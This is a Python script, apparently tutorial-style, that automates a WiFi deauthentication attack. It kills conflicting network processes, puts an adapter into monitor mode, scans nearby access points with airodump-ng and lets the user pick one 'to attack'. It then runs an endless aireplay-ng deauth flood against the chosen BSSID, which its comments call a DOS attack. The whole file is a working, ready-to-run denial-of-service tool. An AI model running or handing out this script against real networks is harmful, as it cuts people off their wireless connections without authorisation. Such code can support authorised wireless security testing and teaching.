import subprocess,re,csv,time,shutil,os
from datetime import datetime

# Creating an list of empty networks
active_wireless_networks = []


# We use this function to test if the ESSID is already in the list file.
# If so we return False so we don't add it again.
# If it is not in the lst we return True which will instruct the elif
# statement to add it to the lst.
def check_for_essid(essid, lst):
    check_status = True

    # If no ESSIDs in list add the row
    if len(lst) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in lst:
        # If True don't add to list. False will add it to list
        if essid in item["ESSID"]:
            check_status = False

    return check_status


# Basic loading screen, will not work on Linux terminal
for letter in "STARTING.......":
    time.sleep(0.5)
    print(letter,end="")
print("\n")



# If the user doesn't run the program with super user privileges, don't allow them to continue.
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

# Remove .csv files before running the script.
for file_name in os.listdir():
    # We should only have one csv file as we delete them from the folder
    #  every time we run the program.
    if ".csv" in file_name:
        print(
            "There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        # We get the current working directory.
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        # Create a timestamp
        timestamp = datetime.now()
        # We move any .csv files in the folder to the backup folder.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex to find wireless interfaces. We're making the assumption they will all be wlan0 or higher.
wlan_pattern = re.compile("^wlan[0-9]+")

# Python allows is to run system commands by using a function provided by the subprocess module.
# subprocess.run(<list of command line arguments goes here>)
# The script is the parent process and creates a child process which runs the system command,
# and will only continue once the child process has completed.
# We run the iwconfig command to look for wireless interfaces.
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No WiFi Adapter connected.
if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

# Menu to select WiFi interface from
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

# For easy reference we call the selected interface hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

# Tell the user we're going to kill the conflicting processes.
print("WiFi adapter connected!\nNow let's kill conflicting processes:")

# subprocess.run(<list of command line arguments goes here>)
# The script is the parent process and creates a child process which runs the system command,
# and will only continue once the child process has completed.
# We run the iwconfig command to look for wireless interfaces.
# Killing all conflicting processes using airmon-ng
kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Put wireless in Monitor mode
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# subprocess.Popen(<list of command line arguments goes here>)
# The Popen method opens a pipe from a command.
# The output is an open file that can be accessed by other programs.
# We run the iwconfig command to look for wireless interfaces.
# Discover access points
discover_access_points = subprocess.Popen(
    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
try:
    while True:
        # We want to clear the screen before we print the network interfaces.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            # We should only have one csv file as we backup all previous csv files from the folder every time we run the program.
            # The following list contains the field names for the csv entries.
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                          'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    # This will run multiple times and we need to reset the cursor to the beginning of the file.
                    csv_h.seek(0)
                    # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above.
                    # This creates a list of dictionaries with the keys as specified in the fieldnames.
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        # We want to exclude the row with BSSID.
                        if row["BSSID"] == "BSSID":
                            pass
                        # We are not interested in the client data.
                        elif row["BSSID"] == "Station MAC":
                            break
                        # Every field where an ESSID is specified will be added to the list.
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # We're using the print statement with an f-string.
            # F-strings are a more intuitive way to include variables when printing strings,
            # rather than ugly concatenations.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before loading the updated list.
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Ensure that the input choice is valid.
while True:
    # If you don't make a choice from the options available in the list,
    # you will be asked to please try again.
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# To make it easier to work with and read the code, we assign the results to variables.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Change to the channel we want to perform the DOS attack on.
# Monitoring takes place on a different channel and we need to set it to that channel.
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# Deauthenticate clients using a subprocess.
# The script is the parent process and creates a child process which runs the system command,
# and will only continue once the child process has completed.
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

# User will need to use control-c to break the script.

